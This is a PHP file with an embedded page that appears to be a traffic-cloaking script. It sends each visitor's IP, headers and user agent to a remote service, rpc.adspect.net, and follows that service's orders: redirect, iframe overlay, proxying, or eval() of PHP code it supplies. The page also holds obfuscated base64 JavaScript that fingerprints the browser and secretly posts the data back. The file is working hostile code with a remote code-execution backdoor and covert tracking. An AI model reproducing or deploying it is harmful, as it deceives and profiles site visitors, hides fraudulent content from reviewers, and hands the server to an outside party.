<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } elseif (array_key_exists('HTTP_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_REAL_IP']]; } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); $headers[] = 'Cache-Control: no-cache'; if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = htmlspecialchars_decode($url); $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } $repl = htmlspecialchars($repl); if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'php-curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('d8f7f6b3-4ec2-48c2-b52e-26e29fdbc9ca', 'redirect', '_', base64_decode('SwNRUb09lZdJMqVHjSqG///AN9izhcnd4bQj69wv3xw=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<body>
<script src="data:text/javascript;base64,ZnVuY3Rpb24gXzB4NDFkOChfMHgxYTM4OTYsXzB4NzRjZjEzKXt2YXIgXzB4M2Y2NTYxPV8weDNmNjUoKTtyZXR1cm4gXzB4NDFkOD1mdW5jdGlvbihfMHg0MWQ4ZWMsXzB4NWQyMDBhKXtfMHg0MWQ4ZWM9XzB4NDFkOGVjLTB4YzI7dmFyIF8weDI2OTA0Mj1fMHgzZjY1NjFbXzB4NDFkOGVjXTtyZXR1cm4gXzB4MjY5MDQyO30sXzB4NDFkOChfMHgxYTM4OTYsXzB4NzRjZjEzKTt9ZnVuY3Rpb24gXzB4M2Y2NSgpe3ZhciBfMHg1OGZhODc9WydjcmVhdGVFdmVudCcsJ2NvbnNvbGUnLCdub2RlVmFsdWUnLCdUb3VjaEV2ZW50JywndG9zdHJpbmcnLCdmb3JtJywnNjgwMDE2dU1iaXNYJywnVU5NQVNLRURfUkVOREVSRVJfV0VCR0wnLCdjYW52YXMnLCdjcmVhdGVFbGVtZW50JywnbmF2aWdhdG9yJywnTm90aWZpY2F0aW9uJywnbWVzc2FnZScsJzMwNDE4VVh1V1l1JywnYXBwZW5kQ2hpbGQnLCdwZXJtaXNzaW9ucycsJ1BPU1QnLCc4MTU5NjY0ZVRTYmFLJywnaW5wdXQnLCc2Njg0NDAyd0pFVVVZJywnbG9nJywnV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycsJ2hyZWYnLCdzdHJpbmdpZnknLCdsb2NhdGlvbicsJ2dldFBhcmFtZXRlcicsJ2Vycm9ycycsJ25hbWUnLCdVTk1BU0tFRF9WRU5ET1JfV0VCR0wnLCd0eXBlJywnZG9jdW1lbnRFbGVtZW50Jywnc2NyZWVuJywnaGlkZGVuJywnY2xvc3VyZScsJzE3ODU2MjIzVVZwRmtaJywncHVzaCcsJzM2MEViVXNYdycsJzE4NjEwYmRlUmJQJywnbm90aWZpY2F0aW9ucycsJzRtY1dPWVonLCd2YWx1ZScsJ2Z1bmN0aW9uJywnNzgxNTM4OEpDVG1xUScsJzVpbkFMalYnLCdwZXJtaXNzaW9uJywncXVlcnknLCd3ZWJnbCcsJ3N1Ym1pdCcsJ3RvdWNoRXZlbnQnLCc0aU95S2RTJywnZ2V0Q29udGV4dCcsJ3RpbWV6b25lT2Zmc2V0JywnZ2V0T3duUHJvcGVydHlOYW1lcycsJ3RvU3RyaW5nJywnZ2V0RXh0ZW5zaW9uJywnb2JqZWN0J107XzB4M2Y2NT1mdW5jdGlvbigpe3JldHVybiBfMHg1OGZhODc7fTtyZXR1cm4gXzB4M2Y2NSgpO30oZnVuY3Rpb24oXzB4NDJhNGRlLF8weDJlZGQ2Yil7dmFyIF8weDczZTMwMD1fMHg0MWQ4LF8weDVhZTZlOT1fMHg0MmE0ZGUoKTt3aGlsZSghIVtdKXt0cnl7dmFyIF8weDExMmFjZj0tcGFyc2VJbnQoXzB4NzNlMzAwKDB4Y2QpKS8weDEqKC1wYXJzZUludChfMHg3M2UzMDAoMHhmMSkpLzB4MikrLXBhcnNlSW50KF8weDczZTMwMCgweGM2KSkvMHgzKigtcGFyc2VJbnQoXzB4NzNlMzAwKDB4ZTcpKS8weDQpKy1wYXJzZUludChfMHg3M2UzMDAoMHhlYikpLzB4NSoocGFyc2VJbnQoXzB4NzNlMzAwKDB4ZDMpKS8weDYpKy1wYXJzZUludChfMHg3M2UzMDAoMHhlYSkpLzB4NytwYXJzZUludChfMHg3M2UzMDAoMHhkMSkpLzB4OCstcGFyc2VJbnQoXzB4NzNlMzAwKDB4ZTQpKS8weDkqKHBhcnNlSW50KF8weDczZTMwMCgweGU1KSkvMHhhKStwYXJzZUludChfMHg3M2UzMDAoMHhlMikpLzB4YjtpZihfMHgxMTJhY2Y9PT1fMHgyZWRkNmIpYnJlYWs7ZWxzZSBfMHg1YWU2ZTlbJ3B1c2gnXShfMHg1YWU2ZTlbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDI1MWEwNSl7XzB4NWFlNmU5WydwdXNoJ10oXzB4NWFlNmU5WydzaGlmdCddKCkpO319fShfMHgzZjY1LDB4OThjNjgpLChmdW5jdGlvbigpe3ZhciBfMHhiZTY5NTc9XzB4NDFkODtmdW5jdGlvbiBfMHgxZTJkN2MoKXt2YXIgXzB4M2M3M2M3PV8weDQxZDg7XzB4M2I0MWFjW18weDNjNzNjNygweGRhKV09XzB4NTFhOTMzO3ZhciBfMHgzNTVkMDQ9ZG9jdW1lbnRbXzB4M2M3M2M3KDB4YzkpXShfMHgzYzczYzcoMHhjNSkpLF8weDRiYmJmZj1kb2N1bWVudFsnY3JlYXRlRWxlbWVudCddKF8weDNjNzNjNygweGQyKSk7XzB4MzU1ZDA0WydtZXRob2QnXT1fMHgzYzczYzcoMHhkMCksXzB4MzU1ZDA0WydhY3Rpb24nXT13aW5kb3dbXzB4M2M3M2M3KDB4ZDgpXVtfMHgzYzczYzcoMHhkNildLF8weDRiYmJmZltfMHgzYzczYzcoMHhkZCldPV8weDNjNzNjNygweGUwKSxfMHg0YmJiZmZbXzB4M2M3M2M3KDB4ZGIpXT0nZGF0YScsXzB4NGJiYmZmW18weDNjNzNjNygweGU4KV09SlNPTltfMHgzYzczYzcoMHhkNyldKF8weDNiNDFhYyksXzB4MzU1ZDA0W18weDNjNzNjNygweGNlKV0oXzB4NGJiYmZmKSxkb2N1bWVudFsnYm9keSddW18weDNjNzNjNygweGNlKV0oXzB4MzU1ZDA0KSxfMHgzNTVkMDRbXzB4M2M3M2M3KDB4ZWYpXSgpO312YXIgXzB4NTFhOTMzPVtdLF8weDNiNDFhYz17fTt0cnl7dmFyIF8weDM2NjI0ZD1mdW5jdGlvbihfMHhmMDgzM2Mpe3ZhciBfMHgxMzA0YmE9XzB4NDFkODtpZihfMHgxMzA0YmEoMHhmNyk9PT10eXBlb2YgXzB4ZjA4MzNjJiZudWxsIT09XzB4ZjA4MzNjKXt2YXIgXzB4NTQ4NzA5PWZ1bmN0aW9uKF8weDVhOTM5Zil7dmFyIF8weDE4MzQzZD1fMHgxMzA0YmE7dHJ5e3ZhciBfMHg1ZWI2NjE9XzB4ZjA4MzNjW18weDVhOTM5Zl07c3dpdGNoKHR5cGVvZiBfMHg1ZWI2NjEpe2Nhc2UgXzB4MTgzNDNkKDB4ZjcpOmlmKG51bGw9PT1fMHg1ZWI2NjEpYnJlYWs7Y2FzZSBfMHgxODM0M2QoMHhlOSk6XzB4NWViNjYxPV8weDVlYjY2MVsndG9TdHJpbmcnXSgpO31fMHgzZTQ1MzVbXzB4NWE5MzlmXT1fMHg1ZWI2NjE7fWNhdGNoKF8weDQwOGNlYSl7XzB4NTFhOTMzW18weDE4MzQzZCgweGUzKV0oXzB4NDA4Y2VhWydtZXNzYWdlJ10pO319LF8weDNlNDUzNT17fSxfMHgyM2U2YzE7Zm9yKF8weDIzZTZjMSBpbiBfMHhmMDgzM2MpXzB4NTQ4NzA5KF8weDIzZTZjMSk7dHJ5e3ZhciBfMHgyOGMzZDU9T2JqZWN0W18weDEzMDRiYSgweGY0KV0oXzB4ZjA4MzNjKTtmb3IoXzB4MjNlNmMxPTB4MDtfMHgyM2U2YzE8XzB4MjhjM2Q1WydsZW5ndGgnXTsrK18weDIzZTZjMSlfMHg1NDg3MDkoXzB4MjhjM2Q1W18weDIzZTZjMV0pO18weDNlNDUzNVsnISEnXT1fMHgyOGMzZDU7fWNhdGNoKF8weDEyMTA0Myl7XzB4NTFhOTMzW18weDEzMDRiYSgweGUzKV0oXzB4MTIxMDQzW18weDEzMDRiYSgweGNjKV0pO31yZXR1cm4gXzB4M2U0NTM1O319O18weDNiNDFhY1snc2NyZWVuJ109XzB4MzY2MjRkKHdpbmRvd1tfMHhiZTY5NTcoMHhkZildKSxfMHgzYjQxYWNbJ3dpbmRvdyddPV8weDM2NjI0ZCh3aW5kb3cpLF8weDNiNDFhY1snbmF2aWdhdG9yJ109XzB4MzY2MjRkKHdpbmRvd1tfMHhiZTY5NTcoMHhjYSldKSxfMHgzYjQxYWNbJ2xvY2F0aW9uJ109XzB4MzY2MjRkKHdpbmRvd1snbG9jYXRpb24nXSksXzB4M2I0MWFjWydjb25zb2xlJ109XzB4MzY2MjRkKHdpbmRvd1tfMHhiZTY5NTcoMHhmOSldKSxfMHgzYjQxYWNbXzB4YmU2OTU3KDB4ZGUpXT1mdW5jdGlvbihfMHgyMzkyZmIpe3ZhciBfMHgxZmJhN2M9XzB4YmU2OTU3O3RyeXt2YXIgXzB4NTc2ZTExPXt9O18weDIzOTJmYj1fMHgyMzkyZmJbJ2F0dHJpYnV0ZXMnXTtmb3IodmFyIF8weDMyYTBkNCBpbiBfMHgyMzkyZmIpXzB4MzJhMGQ0PV8weDIzOTJmYltfMHgzMmEwZDRdLF8weDU3NmUxMVtfMHgzMmEwZDRbJ25vZGVOYW1lJ11dPV8weDMyYTBkNFtfMHgxZmJhN2MoMHhjMildO3JldHVybiBfMHg1NzZlMTE7fWNhdGNoKF8weDEzMmEzMyl7XzB4NTFhOTMzW18weDFmYmE3YygweGUzKV0oXzB4MTMyYTMzW18weDFmYmE3YygweGNjKV0pO319KGRvY3VtZW50W18weGJlNjk1NygweGRlKV0pLF8weDNiNDFhY1snZG9jdW1lbnQnXT1fMHgzNjYyNGQoZG9jdW1lbnQpO3RyeXtfMHgzYjQxYWNbXzB4YmU2OTU3KDB4ZjMpXT1uZXcgRGF0ZSgpWydnZXRUaW1lem9uZU9mZnNldCddKCk7fWNhdGNoKF8weDUyOGU5OCl7XzB4NTFhOTMzWydwdXNoJ10oXzB4NTI4ZTk4W18weGJlNjk1NygweGNjKV0pO310cnl7XzB4M2I0MWFjW18weGJlNjk1NygweGUxKV09ZnVuY3Rpb24oKXt9W18weGJlNjk1NygweGY1KV0oKTt9Y2F0Y2goXzB4MTcwNTNjKXtfMHg1MWE5MzNbXzB4YmU2OTU3KDB4ZTMpXShfMHgxNzA1M2NbXzB4YmU2OTU3KDB4Y2MpXSk7fXRyeXtfMHgzYjQxYWNbXzB4YmU2OTU3KDB4ZjApXT1kb2N1bWVudFtfMHhiZTY5NTcoMHhmOCldKF8weGJlNjk1NygweGMzKSlbXzB4YmU2OTU3KDB4ZjUpXSgpO31jYXRjaChfMHgyYmZmZDEpe18weDUxYTkzM1tfMHhiZTY5NTcoMHhlMyldKF8weDJiZmZkMVsnbWVzc2FnZSddKTt9dHJ5e18weDM2NjI0ZD1mdW5jdGlvbigpe307dmFyIF8weDQyNjdlMT0weDA7XzB4MzY2MjRkW18weGJlNjk1NygweGY1KV09ZnVuY3Rpb24oKXtyZXR1cm4rK18weDQyNjdlMSwnJzt9LGNvbnNvbGVbXzB4YmU2OTU3KDB4ZDQpXShfMHgzNjYyNGQpLF8weDNiNDFhY1tfMHhiZTY5NTcoMHhjNCldPV8weDQyNjdlMTt9Y2F0Y2goXzB4MTExNGYwKXtfMHg1MWE5MzNbXzB4YmU2OTU3KDB4ZTMpXShfMHgxMTE0ZjBbXzB4YmU2OTU3KDB4Y2MpXSk7fXdpbmRvd1tfMHhiZTY5NTcoMHhjYSldW18weGJlNjk1NygweGNmKV1bXzB4YmU2OTU3KDB4ZWQpXSh7J25hbWUnOl8weGJlNjk1NygweGU2KX0pWyd0aGVuJ10oZnVuY3Rpb24oXzB4MWZjZTcyKXt2YXIgXzB4NTRkMzljPV8weGJlNjk1NztfMHgzYjQxYWNbJ3Blcm1pc3Npb25zJ109W3dpbmRvd1tfMHg1NGQzOWMoMHhjYildW18weDU0ZDM5YygweGVjKV0sXzB4MWZjZTcyWydzdGF0ZSddXSxfMHgxZTJkN2MoKTt9LF8weDFlMmQ3Yyk7dHJ5e3ZhciBfMHgxMzFjYzI9ZG9jdW1lbnRbXzB4YmU2OTU3KDB4YzkpXShfMHhiZTY5NTcoMHhjOCkpW18weGJlNjk1NygweGYyKV0oXzB4YmU2OTU3KDB4ZWUpKSxfMHg0ZmY2MDQ9XzB4MTMxY2MyW18weGJlNjk1NygweGY2KV0oXzB4YmU2OTU3KDB4ZDUpKTtfMHgzYjQxYWNbJ3dlYmdsJ109eyd2ZW5kb3InOl8weDEzMWNjMlsnZ2V0UGFyYW1ldGVyJ10oXzB4NGZmNjA0W18weGJlNjk1NygweGRjKV0pLCdyZW5kZXJlcic6XzB4MTMxY2MyW18weGJlNjk1NygweGQ5KV0oXzB4NGZmNjA0W18weGJlNjk1NygweGM3KV0pfTt9Y2F0Y2goXzB4MzU5NTgzKXtfMHg1MWE5MzNbXzB4YmU2OTU3KDB4ZTMpXShfMHgzNTk1ODNbXzB4YmU2OTU3KDB4Y2MpXSk7fX1jYXRjaChfMHgzZmRkNGYpe18weDUxYTkzM1tfMHhiZTY5NTcoMHhlMyldKF8weDNmZGQ0ZltfMHhiZTY5NTcoMHhjYyldKSxfMHgxZTJkN2MoKTt9fSgpKSk7"></script>
</body>
</html>
<?php exit;